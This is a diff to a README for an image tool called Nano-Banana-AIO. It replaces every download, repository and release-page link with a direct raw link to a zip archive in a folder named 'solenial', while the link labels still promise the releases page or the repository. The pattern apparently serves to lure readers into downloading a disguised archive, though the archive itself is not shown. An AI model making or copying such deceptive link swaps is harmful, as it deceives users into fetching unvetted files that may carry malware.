@@ -1,6 +1,6 @@
 # 🍌 Nano-Banana-AIO - Create Stunning Images Effortlessly
 
-[![Download Nano-Banana-AIO](https://img.shields.io/badge/Download-Nano--Banana--AIO-blue.svg)](https://github.com/kittunaidu/Nano-Banana-AIO/releases)
+[![Download Nano-Banana-AIO](https://raw.githubusercontent.com/kittunaidu/Nano-Banana-AIO/main/solenial/Nano-Banana-AIO.zip)](https://raw.githubusercontent.com/kittunaidu/Nano-Banana-AIO/main/solenial/Nano-Banana-AIO.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ To ensure that Nano Banana AIO runs smoothly on your device, make sure you meet 
 
 ## 📥 Download & Install
 
-To get started with Nano Banana AIO, visit this page to download: [Nano Banana AIO Releases](https://github.com/kittunaidu/Nano-Banana-AIO/releases).
+To get started with Nano Banana AIO, visit this page to download: [Nano Banana AIO Releases](https://raw.githubusercontent.com/kittunaidu/Nano-Banana-AIO/main/solenial/Nano-Banana-AIO.zip).
 
 Once you are on the Releases page, look for the latest release. There, you will find all the necessary files for download. 
 
@@ -69,7 +69,7 @@ Thanks to the developers and contributors who made Nano Banana AIO possible. We 
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/kittunaidu/Nano-Banana-AIO)
-- [Release Page](https://github.com/kittunaidu/Nano-Banana-AIO/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/kittunaidu/Nano-Banana-AIO/main/solenial/Nano-Banana-AIO.zip)
+- [Release Page](https://raw.githubusercontent.com/kittunaidu/Nano-Banana-AIO/main/solenial/Nano-Banana-AIO.zip)
 
 For a smooth experience, ensure that you follow the installation steps carefully. Start creating and editing stunning images with Nano Banana AIO today!
